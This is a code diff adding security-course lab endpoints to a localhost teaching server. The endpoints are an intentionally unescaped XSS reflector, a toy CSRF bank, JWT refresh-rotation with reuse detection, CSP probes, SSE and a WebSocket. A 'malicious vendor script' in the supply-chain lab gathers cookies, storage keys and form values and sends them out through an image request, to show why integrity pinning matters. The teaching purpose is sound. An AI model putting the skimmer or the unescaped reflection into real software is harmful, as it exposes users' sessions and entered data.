@@ -26,6 +26,7 @@ import fsp from 'node:fs/promises';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import zlib from 'node:zlib';
+import crypto from 'node:crypto';
 import { renderRoute, MODES, routeCache, cacheStats, invalidate } from './shared/app/render.mjs';
 import * as appData from './shared/app/data.mjs';
 
@@ -80,6 +81,8 @@ const MIME = {
   '.md': 'text/markdown; charset=utf-8',
   '.map': 'application/json; charset=utf-8',
   '.wasm': 'application/wasm',
+  '.webmanifest': 'application/manifest+json; charset=utf-8',
+  '.txt': 'text/plain; charset=utf-8',
 };
 
 function num(q, key, dflt = 0) {
@@ -673,6 +676,579 @@ async function apiProbe(req, res, url) {
   }
 }
 
+/**
+ * /api/reflect — a deliberately unsafe endpoint, for the security course.
+ *
+ * It reflects a query parameter into an HTML response four ways, so the labs can show what
+ * escaping and sanitisation actually prevent. It exists only on this localhost-bound lab server
+ * and is not a pattern to copy — the whole point is to see the vulnerable version fail and the
+ * safe versions hold.
+ *
+ *   ?mode=raw|attr|escaped|sanitized|textnode&input=...
+ */
+function apiReflect(req, res, url) {
+  const q = url.searchParams;
+  const mode = q.get('mode') || 'escaped';
+  const input = q.get('input') ?? '';
+  bump(`reflect:${mode}`);
+
+  const escapeHtml = (s) => String(s).replace(/[&<>"']/g, (c) =>
+    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+
+  // A deliberately small allow-list sanitiser. Real code should use DOMPurify; this exists so
+  // the lab can show the SHAPE of a sanitiser (allow-list, not deny-list) and why a deny-list
+  // loses.
+  const sanitize = (html) => {
+    const allowedTags = /^(b|i|em|strong|p|br|ul|ol|li|code)$/i;
+    return String(html).replace(/<\/?([a-z0-9]+)((?:\s[^>]*)?)>/gi, (match, tag, attrs) => {
+      if (!allowedTags.test(tag)) return '';
+      // Attributes are dropped entirely: that is what removes onerror=, href=javascript:, style=.
+      return match.startsWith('</') ? `</${tag.toLowerCase()}>` : `<${tag.toLowerCase()}>`;
+    });
+  };
+
+  const bodies = {
+    raw: `<div id="out">${input}</div>`,
+    attr: `<div id="out" title="${input}">hover me — the input is in an attribute</div>`,
+    escaped: `<div id="out">${escapeHtml(input)}</div>`,
+    sanitized: `<div id="out">${sanitize(input)}</div>`,
+    textnode: `<div id="out"></div><script>
+      document.getElementById('out').textContent = ${JSON.stringify(input)};
+    </script>`,
+  };
+
+  const html = `<!doctype html><meta charset="utf-8">
+<link rel="stylesheet" href="/shared/lab.css">
+<body style="padding:14px">
+<p class="hint">mode: <b>${escapeHtml(mode)}</b> — this frame is the "vulnerable app"</p>
+${bodies[mode] ?? bodies.escaped}
+</body>`;
+
+  const headers = {
+    'content-type': 'text/html; charset=utf-8',
+    'cache-control': 'no-store',
+  };
+  if (q.has('csp')) headers['content-security-policy'] = q.get('csp');
+  send(res, 200, headers, html);
+}
+
+/**
+ * /api/csp-page — a target document full of probes, for the CSP lab.
+ *
+ * You hand it a policy; it renders a page that tries seven things a real app does (inline script,
+ * external script, eval, styles, images, fetch) and posts the result of each to its parent. That
+ * turns "what does this policy break?" from a guess into a measurement.
+ *
+ *   ?policy=<csp>          sent as Content-Security-Policy
+ *   ?ro=<csp>              sent as Content-Security-Policy-Report-Only
+ *   ?nonce=1               generate a nonce, put it on ONE inline script, and substitute the
+ *                          literal token NONCE in the policy with 'nonce-<value>'
+ */
+function apiCspPage(req, res, url) {
+  const q = url.searchParams;
+  const nonce = q.has('nonce') ? crypto.randomBytes(12).toString('base64') : null;
+  const sub = (p) => (p && nonce ? p.replaceAll('NONCE', `'nonce-${nonce}'`) : p);
+  const nonceAttr = nonce ? ` nonce="${nonce}"` : '';
+
+  const html = `<!doctype html><meta charset="utf-8">
+<link rel="stylesheet" href="/shared/lab.css">
+<style>body{padding:12px;font:12px/1.6 var(--mono)}#probe{color:#7ee787}</style>
+<body>
+<p class="hint">probe page — policy applied by the server</p>
+<div id="probe">running…</div>
+<img id="xo" src="http://localhost:8081/api/image.svg" width="1" height="1" alt="">
+<script${nonceAttr}>
+  window.__p = { 'inline script (nonce)': false, 'inline script (no nonce)': false,
+    'eval()': false, 'external script (same-origin)': false,
+    'external script (cross-origin)': false, 'inline style': false,
+    'image (cross-origin)': false, 'fetch (cross-origin)': false };
+  window.__p['inline script (nonce)'] = true;
+  window.__v = [];
+  document.addEventListener('securitypolicyviolation', (e) => {
+    window.__v.push({ directive: e.effectiveDirective, blocked: String(e.blockedURI).slice(0, 60),
+      disposition: e.disposition, sample: (e.sample || '').slice(0, 40) });
+  });
+  try { window.__p['eval()'] = eval('1+1') === 2; } catch (e) {}
+  document.getElementById('xo').onload = () => { window.__p['image (cross-origin)'] = true; };
+  fetch('http://localhost:8081/api/echo')
+    .then(() => { window.__p['fetch (cross-origin)'] = true; }).catch(() => {});
+  setTimeout(() => {
+    const el = document.createElement('div');
+    el.setAttribute('style', 'color: rgb(1, 2, 3)');
+    document.body.append(el);
+    window.__p['inline style'] = getComputedStyle(el).color === 'rgb(1, 2, 3)';
+    document.getElementById('probe').textContent =
+      Object.entries(window.__p).filter(([, v]) => v).map(([k]) => k).join(', ') || 'everything blocked';
+    parent.postMessage({ probe: window.__p, violations: window.__v }, '*');
+  }, 700);
+</script>
+<script>window.__p['inline script (no nonce)'] = true;</script>
+<script src="/api/csp-probe.js?flag=external%20script%20(same-origin)"></script>
+<script src="http://localhost:8081/api/csp-probe.js?flag=external%20script%20(cross-origin)"></script>
+</body>`;
+
+  const headers = { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' };
+  if (q.get('policy')) headers['content-security-policy'] = sub(q.get('policy'));
+  if (q.get('ro')) headers['content-security-policy-report-only'] = sub(q.get('ro'));
+  send(res, 200, headers, html);
+}
+
+/** A one-line script that flips a flag, so "did this script run?" is observable. */
+function apiCspProbe(req, res, url) {
+  const flag = JSON.stringify(url.searchParams.get('flag') ?? 'unknown');
+  send(res, 200, { 'content-type': 'text/javascript', 'cache-control': 'no-store',
+    'access-control-allow-origin': '*' }, `window.__p[${flag}] = true;`);
+}
+
+/**
+ * /api/csrf — a toy bank, for the CSRF lab.
+ *
+ * The vulnerability is not in this code; it is in the browser's willingness to attach your cookies
+ * to a request another site caused. So the endpoint is deliberately plain, and the DEFENCE is a
+ * switch you flip:
+ *
+ *   ?action=login&samesite=Lax|Strict|None   authenticate, and choose the cookie's SameSite
+ *   ?action=config&defense=none|token|origin  choose the server-side defence
+ *   ?action=state                             balance, defence, and the ledger
+ *   ?action=transfer&to=&amount=              the mutation an attacker wants to cause
+ */
+const bank = { balance: 1000, defense: 'none', ledger: [] };
+
+function readBody(req) {
+  return new Promise((resolve) => {
+    let b = '';
+    req.on('data', (c) => { b += c; });
+    req.on('end', () => resolve(b));
+  });
+}
+
+async function apiCsrf(req, res, url) {
+  const q = url.searchParams;
+  const action = q.get('action') || 'state';
+  const cookies = Object.fromEntries((req.headers.cookie || '').split(';')
+    .map((c) => c.trim().split('=')).filter((p) => p[0]));
+  const appOrigin = `http://localhost:${APP_PORT}`;
+
+  if (action === 'login') {
+    const sameSite = q.get('samesite') || 'Lax';
+    const token = crypto.randomBytes(12).toString('hex');
+    bank.balance = 1000;
+    bank.ledger = [];
+    const attrs = `Path=/; SameSite=${sameSite}${sameSite.toLowerCase() === 'none' ? '; Secure' : ''}`;
+    return json(res, { ok: true, sameSite, token, balance: bank.balance }, 200, {
+      'set-cookie': [
+        `bank_session=user-alice; HttpOnly; Max-Age=3600; ${attrs}`,
+        // The double-submit token is deliberately NOT HttpOnly: the page has to read it to send it.
+        `bank_csrf=${token}; Max-Age=3600; ${attrs}`,
+      ],
+    });
+  }
+
+  if (action === 'logout') {
+    return json(res, { ok: true }, 200, {
+      'set-cookie': ['bank_session=; Path=/; Max-Age=0', 'bank_csrf=; Path=/; Max-Age=0'],
+    });
+  }
+
+  if (action === 'config') {
+    bank.defense = q.get('defense') || 'none';
+    return json(res, { defense: bank.defense });
+  }
+
+  if (action === 'reset') {
+    bank.balance = 1000; bank.ledger = [];
+    return json(res, { ok: true, balance: bank.balance });
+  }
+
+  if (action === 'state') {
+    return json(res, {
+      balance: bank.balance, defense: bank.defense, ledger: bank.ledger.slice(-12),
+      authenticated: Boolean(cookies.bank_session),
+      cookieHeaderSeen: req.headers.cookie || null,
+    }, 200, { 'cache-control': 'no-store' });
+  }
+
+  if (action === 'transfer') {
+    const body = req.method === 'POST' ? await readBody(req) : '';
+    const form = new URLSearchParams(body);
+    const to = form.get('to') ?? q.get('to') ?? 'unknown';
+    const amount = Number(form.get('amount') ?? q.get('amount') ?? 0);
+    const sentToken = form.get('csrf') ?? q.get('csrf') ?? req.headers['x-csrf-token'] ?? null;
+    const origin = req.headers.origin ?? (req.headers.referer ? new URL(req.headers.referer).origin : null);
+
+    const deny = (why) => {
+      bank.ledger.push({ at: new Date().toISOString().slice(11, 19), to, amount, result: `BLOCKED: ${why}` });
+      return finish(403, `blocked — ${why}`);
+    };
+    const finish = (status, message) => {
+      const wantsHtml = (req.headers.accept || '').includes('text/html');
+      if (wantsHtml) {
+        return send(res, status, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' },
+          `<!doctype html><meta charset="utf-8"><link rel="stylesheet" href="/shared/lab.css">
+           <body style="padding:14px"><p class="readout">${message}</p>
+           <p class="hint">balance: ${bank.balance}</p></body>`);
+      }
+      return json(res, { ok: status === 200, message, balance: bank.balance }, status,
+        { 'cache-control': 'no-store' });
+    };
+
+    // 1. Authentication. If the browser did not attach the cookie, the attack failed before it
+    //    reached any application code — that is what SameSite does.
+    if (!cookies.bank_session) return deny('no session cookie was sent with the request');
+
+    // 2. The configured application-level defence.
+    if (bank.defense === 'token' && (!sentToken || sentToken !== cookies.bank_csrf)) {
+      return deny(sentToken ? 'CSRF token did not match' : 'no CSRF token in the request');
+    }
+    if (bank.defense === 'origin' && origin !== appOrigin) {
+      return deny(`Origin/Referer was ${origin ?? '(absent)'}, expected ${appOrigin}`);
+    }
+
+    bank.balance -= amount;
+    bank.ledger.push({ at: new Date().toISOString().slice(11, 19), to, amount, result: 'TRANSFERRED' });
+    return finish(200, `transferred ${amount} to ${to}`);
+  }
+
+  return json(res, { error: 'unknown action' }, 400);
+}
+
+/**
+ * /api/auth — a real-shaped token endpoint, for the auth lab.
+ *
+ * Short-lived signed access token + long-lived rotating refresh token in an HttpOnly cookie,
+ * with refresh-token REUSE DETECTION. That last part is the bit most tutorials skip and the bit
+ * that makes rotation worth doing.
+ *
+ *   ?action=login&ttl=10        issue an access token (seconds) + refresh cookie
+ *   ?action=me                  requires Authorization: Bearer <token>
+ *   ?action=refresh             rotates the refresh cookie, issues a new access token
+ *   ?action=logout              revokes the family
+ *   ?action=sessions            what the server knows (the thing the client cannot tell you)
+ */
+const AUTH_SECRET = crypto.randomBytes(32);
+const refreshTokens = new Map();          // token -> { family, user, used, issuedAt }
+const revokedFamilies = new Set();
+
+const b64url = (buf) => Buffer.from(buf).toString('base64url');
+
+function signJwt(payload, ttlSeconds) {
+  const header = { alg: 'HS256', typ: 'JWT' };
+  const body = { ...payload, iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + ttlSeconds };
+  const data = `${b64url(JSON.stringify(header))}.${b64url(JSON.stringify(body))}`;
+  const sig = crypto.createHmac('sha256', AUTH_SECRET).update(data).digest('base64url');
+  return `${data}.${sig}`;
+}
+
+function verifyJwt(token) {
+  const [h, p, s] = String(token).split('.');
+  if (!h || !p || !s) return { ok: false, why: 'malformed token' };
+  const expected = crypto.createHmac('sha256', AUTH_SECRET).update(`${h}.${p}`).digest('base64url');
+  // timingSafeEqual on equal-length buffers: signature comparison must not leak by timing.
+  const a = Buffer.from(s), b = Buffer.from(expected);
+  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return { ok: false, why: 'bad signature' };
+  const claims = JSON.parse(Buffer.from(p, 'base64url'));
+  if (claims.exp * 1000 < Date.now()) return { ok: false, why: 'expired', claims };
+  return { ok: true, claims };
+}
+
+function issueRefresh(family, user) {
+  const token = crypto.randomBytes(24).toString('hex');
+  refreshTokens.set(token, { family, user, used: false, issuedAt: Date.now() });
+  return token;
+}
+
+function apiAuth(req, res, url) {
+  const q = url.searchParams;
+  const action = q.get('action') || 'me';
+  const cookies = Object.fromEntries((req.headers.cookie || '').split(';')
+    .map((c) => c.trim().split('=')).filter((p) => p[0]));
+  const ttl = num(q, 'ttl', 10);
+  const cookieAttrs = 'Path=/api/auth; HttpOnly; SameSite=Lax; Max-Age=3600';
+
+  if (action === 'login') {
+    const family = crypto.randomBytes(8).toString('hex');
+    const refresh = issueRefresh(family, 'alice');
+    return json(res, {
+      accessToken: signJwt({ sub: 'alice', role: q.get('role') || 'user' }, ttl),
+      expiresIn: ttl,
+      note: 'the refresh token is in an HttpOnly cookie — document.cookie cannot see it',
+    }, 200, { 'set-cookie': `refresh=${refresh}; ${cookieAttrs}` });
+  }
+
+  if (action === 'me') {
+    const auth = req.headers.authorization || '';
+    const token = auth.startsWith('Bearer ') ? auth.slice(7) : q.get('token');
+    if (!token) return json(res, { error: 'no token' }, 401);
+    const v = verifyJwt(token);
+    if (!v.ok) return json(res, { error: v.why, claims: v.claims ?? null }, 401);
+    return json(res, { user: v.claims.sub, role: v.claims.role, exp: v.claims.exp });
+  }
+
+  if (action === 'refresh') {
+    const token = cookies.refresh;
+    const entry = token && refreshTokens.get(token);
+    if (!entry) return json(res, { error: 'no valid refresh token' }, 401);
+    if (revokedFamilies.has(entry.family)) {
+      return json(res, { error: 'this token family was revoked (reuse was detected earlier)' }, 401);
+    }
+    if (entry.used) {
+      // REUSE DETECTION: a rotated token being presented twice means someone kept a copy.
+      // The honest response is to assume theft and kill every session in the family.
+      revokedFamilies.add(entry.family);
+      return json(res, {
+        error: 'refresh token reuse detected — the whole family is revoked',
+        why: 'a rotated token can only be presented once. A second presentation means two parties hold it.',
+      }, 401, { 'set-cookie': 'refresh=; Path=/api/auth; Max-Age=0' });
+    }
+    entry.used = true;
+    const next = issueRefresh(entry.family, entry.user);
+    return json(res, {
+      accessToken: signJwt({ sub: entry.user, role: 'user' }, ttl),
+      expiresIn: ttl, rotated: true,
+    }, 200, { 'set-cookie': `refresh=${next}; ${cookieAttrs}` });
+  }
+
+  if (action === 'replay') {
+    // The lab cannot resend a rotated cookie — the browser already replaced it. This stands in for
+    // an attacker who kept a copy of a refresh token and presents it after the user has rotated.
+    const spent = [...refreshTokens.entries()].filter(([, e]) => e.used).at(-1);
+    if (!spent) return json(res, { error: 'nothing has been rotated yet — refresh once first' }, 400);
+    const [token, entry] = spent;
+    if (revokedFamilies.has(entry.family)) {
+      return json(res, { error: 'family already revoked', family: entry.family }, 401);
+    }
+    revokedFamilies.add(entry.family);
+    return json(res, {
+      error: 'refresh token reuse detected — the whole family is revoked',
+      replayed: `${token.slice(0, 8)}…`, family: entry.family,
+      why: 'a rotated token is single-use. A second presentation means two parties hold it.',
+    }, 401, { 'set-cookie': 'refresh=; Path=/api/auth; Max-Age=0' });
+  }
+
+  if (action === 'logout') {
+    const entry = cookies.refresh && refreshTokens.get(cookies.refresh);
+    if (entry) revokedFamilies.add(entry.family);
+    return json(res, { ok: true }, 200, { 'set-cookie': 'refresh=; Path=/api/auth; Max-Age=0' });
+  }
+
+  if (action === 'sessions') {
+    return json(res, {
+      families: [...new Set([...refreshTokens.values()].map((e) => e.family))].map((f) => ({
+        family: f, revoked: revokedFamilies.has(f),
+        tokens: [...refreshTokens.values()].filter((e) => e.family === f).length,
+      })),
+    });
+  }
+
+  return json(res, { error: 'unknown action' }, 400);
+}
+
+/**
+ * /api/thirdparty.js — a "vendor" script that changes under you, for the supply-chain lab.
+ *
+ *   ?v=1   the version you reviewed
+ *   ?v=2   the same URL, after the vendor pushed an update nobody looked at
+ *
+ * Subresource Integrity exists precisely because ?v=1 and ?v=2 are the same URL.
+ */
+function apiThirdParty(req, res, url) {
+  const v = url.searchParams.get('v') || '1';
+  const benign = `
+// analytics.js v1.0.0 — "just measures page views"
+(function () {
+  window.__vendor = { version: '1.0.0', pageviews: 1 };
+  parent.postMessage({ vendor: '1.0.0', didExfiltrate: false }, '*');
+})();`;
+  const malicious = `
+// analytics.js v1.0.1 — the same URL, one patch release later
+(function () {
+  window.__vendor = { version: '1.0.1', pageviews: 1 };
+  // A third-party script runs with your origin's full authority. This is not an exploit;
+  // it is the documented capability of a <script> tag.
+  var loot = {
+    cookies: document.cookie,
+    storage: Object.keys(localStorage),
+    forms: [].map.call(document.querySelectorAll('input'), function (i) { return i.name + '=' + i.value; }),
+  };
+  new Image().src = 'http://localhost:8081/api/echo?exfil=' + encodeURIComponent(JSON.stringify(loot).slice(0, 120));
+  parent.postMessage({ vendor: '1.0.1', didExfiltrate: true, loot: loot }, '*');
+})();`;
+  const body = v === '2' ? malicious : benign;
+  send(res, 200, {
+    'content-type': 'text/javascript; charset=utf-8',
+    'cache-control': 'no-store',
+    'access-control-allow-origin': '*',
+    // So the lab can show you the hash you would have pinned.
+    'x-sri-sha384': `sha384-${crypto.createHash('sha384').update(body).digest('base64')}`,
+    'access-control-expose-headers': 'x-sri-sha384',
+  }, body);
+}
+
+/** Collects CSP violation reports so the lab can show what a report looks like. */
+const cspReports = [];
+function apiCspReport(req, res, url) {
+  if (url.searchParams.has('list')) return json(res, { reports: cspReports.slice(-20) });
+  if (url.searchParams.has('clear')) { cspReports.length = 0; return json(res, { ok: true }); }
+
+  let body = '';
+  req.on('data', (c) => { body += c; });
+  req.on('end', () => {
+    try { cspReports.push({ at: new Date().toISOString(), report: JSON.parse(body) }); }
+    catch { cspReports.push({ at: new Date().toISOString(), raw: body.slice(0, 500) }); }
+    bump('csp:report');
+    send(res, 204, { 'access-control-allow-origin': '*', 'content-length': 0 });
+  });
+}
+
+// ---------------------------------------------------------------------------
+// Real-time: Server-Sent Events and a hand-rolled WebSocket
+//
+// Both are here because the realtime course is about the DIFFERENCES, and you cannot feel them
+// from a description: SSE is one-way, text-only, auto-reconnecting and rides on plain HTTP;
+// WebSocket is bidirectional, binary-capable, and hands you the reconnection problem.
+// ---------------------------------------------------------------------------
+
+const streamState = { seq: 0, clients: new Set() };
+
+/**
+ * /api/events — an SSE stream.
+ *
+ *   ?interval=1000    how often to send an event
+ *   ?dropAfter=8      close the connection after N events (to exercise reconnection)
+ *   ?flaky=1          fail the initial connection every other time
+ *   Last-Event-ID     honoured: the browser sends it on reconnect, and we resume from it
+ */
+async function apiEvents(req, res, url) {
+  const q = url.searchParams;
+  const interval = num(q, 'interval', 1000);
+  const dropAfter = num(q, 'dropAfter', 0);
+  bump('sse:connect');
+
+  if (bool(q, 'flaky') && bump('sse:flaky') % 2 === 0) {
+    return send(res, 503, { 'content-type': 'text/plain' }, 'flaky: refusing this connection\n');
+  }
+
+  // The client tells us where it got to. This is the part people skip, and it is why their
+  // reconnection loses messages.
+  const lastId = Number(req.headers['last-event-id'] ?? q.get('lastEventId') ?? 0);
+
+  res.writeHead(200, {
+    'content-type': 'text/event-stream',
+    'cache-control': 'no-store',
+    connection: 'keep-alive',
+    'x-accel-buffering': 'no',            // or a proxy will buffer your stream into uselessness
+    'access-control-allow-origin': '*',
+  });
+
+  // `retry:` tells the browser how long to wait before reconnecting. It is a server-side
+  // backoff control that most people never send.
+  res.write(`retry: ${num(q, 'retry', 1000)}\n\n`);
+
+  if (lastId && lastId < streamState.seq) {
+    for (let id = lastId + 1; id <= streamState.seq; id++) {
+      res.write(`id: ${id}\nevent: replay\ndata: ${JSON.stringify({ id, replayed: true })}\n\n`);
+    }
+  }
+
+  let sent = 0;
+  const timer = setInterval(() => {
+    const id = ++streamState.seq;
+    res.write(`id: ${id}\nevent: tick\ndata: ${JSON.stringify({ id, at: new Date().toISOString(), value: Math.round(Math.sin(id / 5) * 100) })}\n\n`);
+    if (dropAfter && ++sent >= dropAfter) {
+      clearInterval(timer);
+      res.end();                          // the browser will reconnect on its own
+    }
+  }, interval);
+
+  req.on('close', () => clearInterval(timer));
+}
+
+/**
+ * A minimal WebSocket server, written out rather than imported, because the handshake and the
+ * framing are the interesting part: an HTTP Upgrade, a SHA-1 of the client key plus a magic
+ * GUID, and then length-prefixed, masked frames.
+ */
+const WS_GUID = '258EAFA5-E914-47DA-95CA-5AB0DC85B11F';
+const wsClients = new Set();
+
+function handleUpgrade(req, socket) {
+  const key = req.headers['sec-websocket-key'];
+  if (!key) return socket.destroy();
+  const accept = crypto.createHash('sha1').update(key + WS_GUID).digest('base64');
+
+  socket.write(
+    'HTTP/1.1 101 Switching Protocols\r\n' +
+    'Upgrade: websocket\r\n' +
+    'Connection: Upgrade\r\n' +
+    `Sec-WebSocket-Accept: ${accept}\r\n\r\n`,
+  );
+  bump('ws:connect');
+  wsClients.add(socket);
+
+  const url = new URL(req.url, `http://${req.headers.host}`);
+  const dropAfter = num(url.searchParams, 'dropAfter', 0);
+  let sent = 0;
+
+  const timer = setInterval(() => {
+    if (socket.destroyed) return clearInterval(timer);
+    sendFrame(socket, JSON.stringify({ type: 'tick', id: ++streamState.seq, at: new Date().toISOString() }));
+    if (dropAfter && ++sent >= dropAfter) {
+      clearInterval(timer);
+      socket.destroy();                   // an abrupt close: no close frame, like a dropped network
+    }
+  }, num(url.searchParams, 'interval', 1000));
+
+  socket.on('data', (buf) => {
+    const message = readFrame(buf);
+    if (message == null) return;
+    if (message === 'ping') return sendFrame(socket, JSON.stringify({ type: 'pong', at: Date.now() }));
+    // Echo, and broadcast to everyone else — enough to demo collaboration.
+    for (const client of wsClients) {
+      if (client.destroyed) { wsClients.delete(client); continue; }
+      sendFrame(client, JSON.stringify({ type: 'message', from: client === socket ? 'you' : 'peer', body: message }));
+    }
+  });
+
+  socket.on('close', () => { clearInterval(timer); wsClients.delete(socket); });
+  socket.on('error', () => { clearInterval(timer); wsClients.delete(socket); });
+}
+
+/** Server→client frames are never masked, and we only send text. */
+function sendFrame(socket, text) {
+  const payload = Buffer.from(text);
+  const len = payload.length;
+  let header;
+  if (len < 126) {
+    header = Buffer.from([0x81, len]);
+  } else if (len < 65536) {
+    header = Buffer.alloc(4);
+    header[0] = 0x81; header[1] = 126; header.writeUInt16BE(len, 2);
+  } else {
+    header = Buffer.alloc(10);
+    header[0] = 0x81; header[1] = 127; header.writeBigUInt64BE(BigInt(len), 2);
+  }
+  socket.write(Buffer.concat([header, payload]));
+}
+
+/** Client→server frames are always masked. Single-frame text messages only — enough for a lab. */
+function readFrame(buf) {
+  if (buf.length < 2) return null;
+  const opcode = buf[0] & 0x0f;
+  if (opcode === 0x8) return null;                       // close
+  if (opcode !== 0x1) return null;                       // text only
+  const masked = (buf[1] & 0x80) !== 0;
+  let len = buf[1] & 0x7f;
+  let offset = 2;
+  if (len === 126) { len = buf.readUInt16BE(2); offset = 4; }
+  else if (len === 127) { len = Number(buf.readBigUInt64BE(2)); offset = 10; }
+  if (!masked) return buf.slice(offset, offset + len).toString();
+  const mask = buf.slice(offset, offset + 4);
+  const data = buf.slice(offset + 4, offset + 4 + len);
+  const out = Buffer.alloc(data.length);
+  for (let i = 0; i < data.length; i++) out[i] = data[i] ^ mask[i % 4];
+  return out.toString();
+}
+
 // ---------------------------------------------------------------------------
 // Introspection: did the request actually reach the server?
 // ---------------------------------------------------------------------------
@@ -767,6 +1343,14 @@ function sendFile(req, res, abs, url) {
     'timing-allow-origin': '*',
     'cross-origin-resource-policy': 'cross-origin',
   };
+  // `?csp=...` sets a Content-Security-Policy on any lab page, so the security course can try
+  // policies against real pages without a build step.
+  if (url.searchParams.has('csp')) {
+    headers['content-security-policy'] = url.searchParams.get('csp');
+  }
+  if (url.searchParams.has('cspRO')) {
+    headers['content-security-policy-report-only'] = url.searchParams.get('cspRO');
+  }
   // `?isolate=1` turns on cross-origin isolation for that document, which is what
   // SharedArrayBuffer and high-resolution timers require. See web-workers lab 02.
   if (url.searchParams.has('isolate')) {
@@ -869,6 +1453,14 @@ const ROUTES = {
   '/api/image.svg': apiImage,
   '/api/font': apiFont,
   '/api/text': apiText,
+  '/api/events': apiEvents,
+  '/api/reflect': apiReflect,
+  '/api/csp-report': apiCspReport,
+  '/api/csp-page': apiCspPage,
+  '/api/csrf': apiCsrf,
+  '/api/auth': apiAuth,
+  '/api/thirdparty.js': apiThirdParty,
+  '/api/csp-probe.js': apiCspProbe,
   '/api/edge': apiEdge,
   '/api/rows': apiRows,
   '/api/blob': apiBlob,
@@ -905,7 +1497,10 @@ async function handler(req, res) {
 }
 
 for (const port of [APP_PORT, ALT_PORT]) {
-  http.createServer(handler).listen(port, () => {
+  const server = http.createServer(handler);
+  // The WebSocket lives on the same port: it starts as an HTTP request and is upgraded.
+  server.on('upgrade', (req, socket) => handleUpgrade(req, socket));
+  server.listen(port, () => {
     const role = port === APP_PORT ? 'app origin  ' : 'alt origin  ';
     console.log(`  ${role} http://localhost:${port}`);
   });
